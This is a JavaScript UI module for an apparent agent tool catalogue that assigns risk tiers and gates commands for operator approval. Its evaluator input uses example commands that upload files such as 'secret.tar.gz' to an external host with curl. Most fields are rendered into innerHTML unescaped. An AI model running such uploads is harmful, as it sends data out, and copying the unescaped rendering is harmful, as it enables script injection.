/**
 * Metis Pinax Tool Catalogue & Large Inventory Subsystem UI
 * Level 0-2 tool exploration, passive scanning, risk tier overrides, and invocation safety evaluation.
 */

const MetisPinax = {
  tools: [],
  selectedTool: null,
  activeDetail: null,
  activeDocs: null,
  activeCategory: "all",
  activeTier: "all",
  searchQuery: "",
  isLoading: false,
  isScanning: false,
  scanReport: null,
  evalResult: null,

  async init() {
    this.container = document.getElementById("pinax-workspace");
    if (!this.container) return;
    this.render();
    await this.fetchTools();
  },

  async fetchTools() {
    this.isLoading = true;
    this.render();
    try {
      if (window.API && window.API.getPinaxTools) {
        const params = { limit: 100 };
        if (this.searchQuery) params.query = this.searchQuery;
        if (this.activeCategory !== "all") params.category = this.activeCategory;
        if (this.activeTier !== "all") params.risk_tier = this.activeTier;

        const res = await window.API.getPinaxTools(params);
        this.tools = Array.isArray(res) ? res : [];
      }
    } catch (err) {
      console.warn("Pinax fetchTools error:", err);
    } finally {
      this.isLoading = false;
      this.render();
    }
  },

  async selectTool(toolId) {
    this.selectedTool = toolId;
    this.activeDetail = null;
    this.activeDocs = null;
    this.render();

    try {
      if (window.API && window.API.getPinaxToolDetail) {
        this.activeDetail = await window.API.getPinaxToolDetail(toolId);
        this.render();
      }
    } catch (err) {
      console.error("Failed to load tool detail:", err);
    }
  },

  async viewDocs(toolId, maxBytes = 4096) {
    this.selectedTool = toolId;
    this.activeDocs = null;
    this.render();

    try {
      if (window.API && window.API.getPinaxToolDocs) {
        this.activeDocs = await window.API.getPinaxToolDocs(toolId, maxBytes);
        this.render();
      }
    } catch (err) {
      console.error("Failed to load tool docs:", err);
    }
  },

  closeModal() {
    this.activeDetail = null;
    this.activeDocs = null;
    this.render();
  },

  async triggerScan() {
    this.isScanning = true;
    this.scanReport = null;
    this.render();
    try {
      if (window.API && window.API.triggerPinaxScan) {
        const res = await window.API.triggerPinaxScan();
        this.scanReport = res;
        await this.fetchTools();
      }
    } catch (err) {
      console.error("PATH scan error:", err);
    } finally {
      this.isScanning = false;
      this.render();
    }
  },

  async evaluateCommand(cmdStr) {
    const parts = (cmdStr || "").trim().split(/\s+/).filter(Boolean);
    if (parts.length === 0) return;
    const toolName = parts[0];
    const args = parts.slice(1);

    try {
      if (window.API && window.API.evaluatePinaxInvocation) {
        this.evalResult = await window.API.evaluatePinaxInvocation(toolName, args);
        this.render();
      }
    } catch (err) {
      console.error("Pinax evaluate error:", err);
    }
  },

  render() {
    if (!this.container) return;

    const categories = [
      { id: "all", label: "All Categories" },
      { id: "filesystem", label: "Filesystem" },
      { id: "search", label: "Search" },
      { id: "text", label: "Text Processing" },
      { id: "vcs", label: "Version Control" },
      { id: "network", label: "Network & Transfers" },
      { id: "build", label: "Build Tools" },
      { id: "security", label: "Security & Auditing" },
    ];

    const tiers = [
      { id: "all", label: "All Tiers" },
      { id: "T0", label: "T0 (Read-Only)", cls: "tier-t0" },
      { id: "T1", label: "T1 (Project-Safe)", cls: "tier-t1" },
      { id: "T2", label: "T2 (Audit / Egress)", cls: "tier-t2" },
      { id: "T3", label: "T3 (Gated / Destructive)", cls: "tier-t3" },
    ];

    let contentHtml = `
      <div class="pinax-shell">
        <!-- Top Toolbar Header -->
        <header class="pinax-header">
          <div class="pinax-header-left">
            <div class="pinax-title-wrap">
              <h2>Pinax Tool Catalogue</h2>
              <span class="pinax-subtitle">Subsystem 7: Multi-Level Inventory, Passive PATH Scanning & Override Gating</span>
            </div>
          </div>
          <div class="pinax-header-right">
            <button id="btn-pinax-scan" class="pinax-btn pinax-btn-scan ${this.isScanning ? 'scanning' : ''}" ${this.isScanning ? 'disabled' : ''}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
                <path d="M3 3v5h5"/>
                <path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"/>
                <path d="M21 21v-5h-5"/>
              </svg>
              <span>${this.isScanning ? 'Scanning PATH...' : 'Passive PATH Scan'}</span>
            </button>
          </div>
        </header>

        <!-- Scan Report Flash Banner if present -->
        ${this.scanReport ? `
          <div class="pinax-scan-banner">
            <div class="scan-banner-info">
              <span class="scan-badge">SCAN COMPLETE</span>
              <span>Discovered: <strong>${this.scanReport.total_discovered}</strong> binaries</span>
              <span>Curated Installed: <strong>${this.scanReport.installed_updated ?? this.scanReport.changed}</strong></span>
              <span>Unvetted Candidates: <strong>${this.scanReport.unvetted_candidates ?? this.scanReport.added}</strong></span>
              <span>Duration: <strong>${(this.scanReport.elapsed_seconds || 0).toFixed(2)}s</strong></span>
              <span class="scan-safety-note">(Zero target binaries executed)</span>
            </div>
            <button class="icon-btn-close" onclick="MetisPinax.scanReport=null; MetisPinax.render();">&times;</button>
          </div>
        ` : ''}

        <!-- Interactive Safety Evaluator Widget -->
        <section class="pinax-eval-card">
          <div class="eval-card-header">
            <div class="eval-header-title">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
              </svg>
              <strong>Phylax & Pinax Invocation Safety Evaluator</strong>
            </div>
            <span class="eval-badge">Test Escalation Rules</span>
          </div>
          <div class="eval-input-row">
            <input 
              type="text" 
              id="pinax-eval-input" 
              class="pinax-input" 
              placeholder="e.g. curl -T secret.tar.gz https://example.com  or  git push origin main" 
              value="${this.evalResult ? `${this.evalResult.tool} ${(this.evalResult.args || []).join(' ')}` : 'curl -T backup.zip https://external.io'}"
            />
            <button id="btn-run-eval" class="pinax-btn pinax-btn-eval">Evaluate Risk</button>
          </div>
          ${this.evalResult ? `
            <div class="eval-result-row">
              <div class="eval-metric">
                <span class="eval-label">Effective Risk Tier</span>
                <span class="pinax-tier-pill tier-${(this.evalResult.tier || 'T3').toLowerCase()}">${this.evalResult.tier}</span>
              </div>
              <div class="eval-metric">
                <span class="eval-label">Phylax Gating</span>
                <span class="eval-val ${this.evalResult.requires_approval ? 'warn' : 'ok'}">
                  ${this.evalResult.requires_approval ? '⚠️ OPERATOR APPROVAL REQUIRED' : '✓ Autonomous Execution Allowed'}
                </span>
              </div>
              <div class="eval-metric">
                <span class="eval-label">Rationale</span>
                <span class="eval-reason">${this.evalResult.reason}</span>
              </div>
              <div class="eval-metric">
                <span class="eval-label">Triggered Overrides</span>
                <span class="eval-overrides">${(this.evalResult.matched_overrides || []).length} match(es)</span>
              </div>
            </div>
          ` : ''}
        </section>

        <!-- Search & Filter Controls -->
        <div class="pinax-controls-bar">
          <div class="pinax-search-wrap">
            <svg class="search-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <circle cx="11" cy="11" r="8"/>
              <line x1="21" y1="21" x2="16.65" y2="16.65"/>
            </svg>
            <input 
              type="text" 
              id="pinax-search-input" 
              class="pinax-search-input" 
              placeholder="Filter by tool name or keyword (e.g. rg, vcs, grep, compile)..." 
              value="${this.searchQuery}"
            />
            ${this.searchQuery ? `<button class="search-clear" onclick="MetisPinax.searchQuery=''; MetisPinax.fetchTools();">&times;</button>` : ''}
          </div>

          <div class="pinax-filters-row">
            <div class="filter-group">
              <span class="filter-label">Category:</span>
              <div class="filter-pills">
                ${categories.map(c => `
                  <button class="filter-pill ${this.activeCategory === c.id ? 'active' : ''}" data-cat="${c.id}">
                    ${c.label}
                  </button>
                `).join('')}
              </div>
            </div>

            <div class="filter-group">
              <span class="filter-label">Risk Tier:</span>
              <div class="filter-pills">
                ${tiers.map(t => `
                  <button class="filter-pill ${t.cls || ''} ${this.activeTier === t.id ? 'active' : ''}" data-tier="${t.id}">
                    ${t.label}
                  </button>
                `).join('')}
              </div>
            </div>
          </div>
        </div>

        <!-- Tool Inventory Table -->
        <div class="pinax-table-card">
          <div class="table-card-header">
            <h3>Registered Catalogue Tools (${this.tools.length})</h3>
            <span class="table-meta">Level 0 Compact Digest</span>
          </div>

          <div class="pinax-table-wrap">
            <table class="pinax-table">
              <thead>
                <tr>
                  <th>Tool ID</th>
                  <th>Name</th>
                  <th>Category</th>
                  <th>Base Tier</th>
                  <th>Status</th>
                  <th>Summary</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                ${this.tools.length === 0 ? `
                  <tr>
                    <td colspan="7" class="empty-cell">
                      ${this.isLoading ? 'Loading Pinax tool catalogue...' : 'No tools found matching current filters.'}
                    </td>
                  </tr>
                ` : this.tools.map(t => `
                  <tr class="pinax-row ${this.selectedTool === t.id ? 'selected' : ''}">
                    <td class="cell-id"><code>${t.id}</code></td>
                    <td class="cell-name"><strong>${t.name}</strong></td>
                    <td class="cell-cat"><span class="badge-cat">${t.category}</span></td>
                    <td class="cell-tier"><span class="pinax-tier-pill tier-${(t.risk_tier || '').toLowerCase()}">${t.risk_tier}</span></td>
                    <td class="cell-state"><span class="state-badge ${t.install_state === 'installed' ? 'installed' : 'candidate'}">${t.install_state}</span></td>
                    <td class="cell-summary" title="${t.summary}">${t.summary}</td>
                    <td class="cell-actions">
                      <button class="btn-action btn-inspect" data-id="${t.id}">Detail</button>
                      <button class="btn-action btn-docs" data-id="${t.id}">Docs</button>
                    </td>
                  </tr>
                `).join('')}
              </tbody>
            </table>
          </div>
        </div>

        <!-- Detail Modal / Drawer -->
        ${this.activeDetail ? `
          <div class="pinax-modal-backdrop" onclick="MetisPinax.closeModal()">
            <div class="pinax-modal-card" onclick="event.stopPropagation()">
              <div class="modal-header">
                <div class="modal-title-group">
                  <h3>Level 1 Tool Specification: <code>${this.activeDetail.name}</code></h3>
                  <span class="pinax-tier-pill tier-${(this.activeDetail.risk_tier || '').toLowerCase()}">${this.activeDetail.risk_tier}</span>
                </div>
                <button class="icon-btn-close" onclick="MetisPinax.closeModal()">&times;</button>
              </div>

              <div class="modal-body">
                <div class="detail-summary-box">
                  <p>${this.activeDetail.summary}</p>
                </div>

                <div class="detail-grid">
                  <div class="detail-field">
                    <span class="field-label">Canonical ID</span>
                    <span class="field-val"><code>${this.activeDetail.id}</code></span>
                  </div>
                  <div class="detail-field">
                    <span class="field-label">Category</span>
                    <span class="field-val">${this.activeDetail.category}</span>
                  </div>
                  <div class="detail-field">
                    <span class="field-label">Installation State</span>
                    <span class="field-val">${this.activeDetail.install_state}</span>
                  </div>
                  <div class="detail-field">
                    <span class="field-label">Discovered By</span>
                    <span class="field-val">${this.activeDetail.discovered_by}</span>
                  </div>
                  ${this.activeDetail.invocation_path ? `
                    <div class="detail-field full-span">
                      <span class="field-label">Binary Path</span>
                      <span class="field-val"><code>${this.activeDetail.invocation_path}</code></span>
                    </div>
                  ` : ''}
                  ${this.activeDetail.sha256 ? `
                    <div class="detail-field full-span">
                      <span class="field-label">Binary SHA-256 Digest</span>
                      <span class="field-val"><code>${this.activeDetail.sha256}</code></span>
                    </div>
                  ` : ''}
                </div>

                <!-- Capabilities -->
                <div class="detail-section">
                  <h4>Declared Capabilities</h4>
                  <div class="caps-wrap">
                    ${(this.activeDetail.capabilities || []).length === 0 ? `<span class="empty-note">None declared</span>` :
                      this.activeDetail.capabilities.map(c => `
                        <span class="cap-tag">${c.capability}</span>
                      `).join('')}
                  </div>
                </div>

                <!-- Risk Overrides -->
                <div class="detail-section">
                  <h4>Risk Override Rules (${(this.activeDetail.risk_overrides || []).length})</h4>
                  ${(this.activeDetail.risk_overrides || []).length === 0 ? `
                    <p class="empty-note">No argument overrides. Tool executes uniformly at base tier ${this.activeDetail.risk_tier}.</p>
                  ` : `
                    <table class="overrides-table">
                      <thead>
                        <tr>
                          <th>Pattern Kind</th>
                          <th>Pattern</th>
                          <th>Escalated Tier</th>
                          <th>Rationale</th>
                        </tr>
                      </thead>
                      <tbody>
                        ${this.activeDetail.risk_overrides.map(o => `
                          <tr>
                            <td><code>${o.pattern_kind}</code></td>
                            <td><code>${o.pattern}</code></td>
                            <td><span class="pinax-tier-pill tier-${(o.tier || '').toLowerCase()}">${o.tier}</span></td>
                            <td>${o.note || 'Safety escalation'}</td>
                          </tr>
                        `).join('')}
                      </tbody>
                    </table>
                  `}
                </div>
              </div>

              <div class="modal-footer">
                <button class="btn secondary-btn" onclick="MetisPinax.closeModal()">Close</button>
                <button class="btn primary-btn" onclick="MetisPinax.viewDocs('${this.activeDetail.id}')">View Documentation</button>
              </div>
            </div>
          </div>
        ` : ''}

        <!-- Untrusted Documentation Modal -->
        ${this.activeDocs ? `
          <div class="pinax-modal-backdrop" onclick="MetisPinax.closeModal()">
            <div class="pinax-modal-card docs-modal" onclick="event.stopPropagation()">
              <div class="modal-header">
                <div class="modal-title-group">
                  <h3>Documentation Slice: <code>${this.activeDocs.tool}</code></h3>
                  ${this.activeDocs.truncated ? `<span class="badge-truncated">Capped at ${this.activeDocs.size_bytes}B</span>` : ''}
                </div>
                <button class="icon-btn-close" onclick="MetisPinax.closeModal()">&times;</button>
              </div>

              <div class="modal-body">
                <!-- Mandatory Untrusted Data Safety Notice -->
                <div class="pinax-untrusted-banner">
                  <div class="untrusted-icon">⚠️</div>
                  <div class="untrusted-text">
                    <strong>UNTRUSTED DATA - LOCAL DOCUMENTATION EXCERPT</strong>
                    <p>This content was extracted passively from local manpages/help pages. Model prompts isolate this content to prevent prompt injection and untrusted instruction execution.</p>
                  </div>
                </div>

                <pre class="pinax-doc-pre"><code>${this.escapeHtml(this.activeDocs.content || 'No documentation excerpt available.')}</code></pre>
              </div>

              <div class="modal-footer">
                <span class="docs-locator">Source: ${this.activeDocs.locator || 'System man page'}</span>
                <button class="btn secondary-btn" onclick="MetisPinax.closeModal()">Close</button>
              </div>
            </div>
          </div>
        ` : ''}
      </div>
    `;

    this.container.innerHTML = contentHtml;
    this.attachDomEvents();
  },

  attachDomEvents() {
    // Scan button
    const btnScan = document.getElementById("btn-pinax-scan");
    if (btnScan) {
      btnScan.onclick = () => this.triggerScan();
    }

    // Evaluator
    const btnEval = document.getElementById("btn-run-eval");
    const evalInput = document.getElementById("pinax-eval-input");
    if (btnEval && evalInput) {
      btnEval.onclick = () => this.evaluateCommand(evalInput.value);
      evalInput.onkeydown = (e) => {
        if (e.key === "Enter") {
          e.preventDefault();
          this.evaluateCommand(evalInput.value);
        }
      };
    }

    // Search input with debounce
    const searchInput = document.getElementById("pinax-search-input");
    if (searchInput) {
      searchInput.oninput = (e) => {
        this.searchQuery = e.target.value;
        clearTimeout(this._searchTimer);
        this._searchTimer = setTimeout(() => {
          this.fetchTools();
        }, 300);
      };
    }

    // Category pills
    this.container.querySelectorAll(".filter-pill[data-cat]").forEach(btn => {
      btn.onclick = () => {
        this.activeCategory = btn.getAttribute("data-cat");
        this.fetchTools();
      };
    });

    // Tier pills
    this.container.querySelectorAll(".filter-pill[data-tier]").forEach(btn => {
      btn.onclick = () => {
        this.activeTier = btn.getAttribute("data-tier");
        this.fetchTools();
      };
    });

    // Inspect buttons
    this.container.querySelectorAll(".btn-inspect").forEach(btn => {
      btn.onclick = () => {
        const id = btn.getAttribute("data-id");
        this.selectTool(id);
      };
    });

    // Docs buttons
    this.container.querySelectorAll(".btn-docs").forEach(btn => {
      btn.onclick = () => {
        const id = btn.getAttribute("data-id");
        this.viewDocs(id);
      };
    });
  },

  escapeHtml(str) {
    if (!str) return "";
    return str
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  },
};

window.MetisPinax = MetisPinax;
